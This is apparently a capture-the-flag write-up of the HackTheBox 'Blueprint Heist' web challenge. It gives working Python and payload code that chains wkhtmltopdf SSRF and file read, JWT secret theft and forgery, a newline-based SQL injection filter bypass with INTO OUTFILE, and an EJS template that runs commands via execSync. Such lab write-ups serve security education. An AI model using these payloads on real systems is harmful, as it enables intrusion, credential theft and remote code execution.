---
title: "HTB Cyber Apocalypse: Blueprint Heist"
description: "A local Codex solve that chained wkhtmltopdf SSRF, PDF-based file read, JWT forgery, GraphQL SQLi, and EJS template execution."
slug: htb-blueprint-heist
date: 2026-02-10 15:09:00+0300
categories:
    - Web Exploitation
tags:
    - htb
    - web
    - ssrf
    - graphql
    - sqli
    - ejs
---

## Challenge

`Blueprint Heist` asked for access to the ministry planning system behind `154.57.164.66:30234`. The local archive included the full Node application and the final Codex solve script, so the exploit path was easy to verify from first principles.

## Attack Surface

The app exposed three primitives that chained cleanly:

- `/download` passed attacker-controlled URLs directly to `wkhtmltopdf`.
- The generated PDF could be parsed locally, so SSRF and local file reads became practical.
- `/graphql` was internal-only, but it trusted an admin JWT in the query string.
- `getDataByName` built SQL with string interpolation and filtered only a brittle punctuation blacklist.
- The app rendered custom EJS error pages from disk.

The local solve chain became:

1. Get a guest token.
2. Abuse the PDF generator to read `file:///app/.env%00.js`.
3. Extract the JWT secret from the returned PDF.
4. Forge an admin token.
5. SSRF the internal GraphQL endpoint with the forged token.
6. Use SQL injection to write a malicious EJS template with `INTO OUTFILE`.
7. Trigger that template through a `403` response and execute `/readflag`.

## Step 1: Turn `/download` Into SSRF And Local File Read

`downloadController.js` fed the user-supplied URL straight into `wkhtmltopdf`:

```javascript
wkhtmltopdf(url, { output: pdfPath }, (err) => { ... })
```

That immediately made `file://` reads and internal HTTP requests interesting. The working read target was the local `.env` file:

```python
import requests

BASE = "http://154.57.164.66:30234"
user_tok = requests.get(f"{BASE}/getToken").text.strip()

env_pdf = requests.post(
    f"{BASE}/download",
    params={"token": user_tok},
    data={"url": "file:///app/.env%00.js"},
).content
```

The returned content was a PDF, so the next step was decoding the text layer locally.

## Step 2: Recover The JWT Secret From The PDF

The solve script reconstructed the `ToUnicode` map from the wkhtmltopdf output and decoded the text stream. After parsing the PDF, the `.env` contents exposed the signing secret:

```python
secret = re.search(r"secret=([^\s]+)", env_txt).group(1)
```

From there, forging an admin token was straightforward:

```python
admin_tok = jwt_hs256(secret, {"role": "admin", "iat": int(time.time())})
```

## Step 3: Reach The Internal GraphQL Endpoint

`internal.js` protected `/graphql` with an admin JWT and an internal-IP check:

```javascript
if (requiredRole === "admin" && role === "admin") {
    if (!checkInternal(req)) {
        return next(generateError(403, "Only available for internal users!"));
    }
}
```

Because the PDF generator could request arbitrary URLs from inside the container, it doubled as the internal client:

```python
internal = f"http://127.0.0.1:1337/graphql?token={admin_tok}&query={quote(gql, safe='')}"
requests.post(
    f"{BASE}/download",
    params={"token": user_tok},
    data={"url": internal},
)
```

## Step 4: Bypass The SQLi Filter And Write A Template

The GraphQL resolver built a query with direct interpolation:

```javascript
data = await connection.query(`SELECT * FROM users WHERE name like '%${args.name}%'`)
```

Its filter rejected punctuation, but it did not reject a newline. Prefixing the payload with `\n` bypassed the check and let me use `UNION SELECT ... INTO OUTFILE` to plant a malicious EJS file:

```python
ejs = '<%= require("child_process").execSync("/readflag").toString() %>'
inj = "\\n' UNION SELECT 1,'" + ejs + "','x',0 INTO OUTFILE '/app/views/errors/403.ejs'-- -"
gql = '{getDataByName(name:"' + inj + '"){name}}'
```

## Step 5: Trigger The Template And Read The Flag

Once `403.ejs` was replaced, an external request to the admin page still failed the internal-IP check, but that was now exactly what I wanted because the `403` renderer executed the malicious template:

```python
r = requests.get(f"{BASE}/admin", params={"token": admin_tok}, timeout=10)
flag = re.search(r"HTB\\{[^}]+\\}", r.text).group(0)
print(flag)
```

## Final Result

Flag:

```text
HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_d27cb7891f6999c8ff834fbfce0e0e8c}
```

## Notes

- The PDF generator was the entry point for both file read and internal-only HTTP access.
- The GraphQL SQLi filter failed because it tried to blacklist characters instead of enforcing a strict allowlist.
- Writing into the EJS error template was cleaner than fighting for shell access. The application already had a convenient error path that executed the payload for me.
